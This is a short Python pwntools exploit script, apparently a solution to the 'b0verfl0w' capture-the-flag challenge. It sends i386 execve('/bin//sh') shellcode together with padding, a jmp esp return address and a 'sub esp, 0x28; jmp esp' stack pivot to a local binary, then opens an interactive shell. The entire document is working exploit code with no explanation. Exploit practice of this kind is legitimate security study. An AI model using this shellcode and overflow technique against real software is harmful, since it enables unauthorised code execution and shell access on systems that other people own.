#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
p = process('./b0verfl0w')
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
sub_esp_jmp = asm('sub esp, 0x28; jmp esp')
print 'sub_esp_jmp =', sub_esp_jmp
jmp_esp = 0x08048504
payload = flat([
	shellcode, 
	(0x20 - len(shellcode)) * 'A', 
	'BBBB', 
	jmp_esp, 
	sub_esp_jmp
])
p.sendline(payload)
p.interactive()
